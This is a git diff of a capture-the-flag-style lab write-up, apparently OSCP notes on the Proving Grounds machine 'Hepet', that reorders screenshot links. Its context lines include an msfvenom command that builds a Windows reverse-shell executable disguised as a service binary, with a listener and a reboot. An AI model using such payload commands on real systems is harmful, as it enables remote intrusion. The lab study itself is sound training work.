@@ -145,6 +145,8 @@ Creating a reverse shell.
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.220 LPORT=443 -f exe -o veyon-service.exe
 ```
 
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h27m10s_032_.png)
+
 We active the http server for file transfer.
 
 ```
@@ -167,4 +169,5 @@ Starting a new listener and rebooting.
 shutdown /r
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h27m10s_032_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h36m13s_033_.png)
+
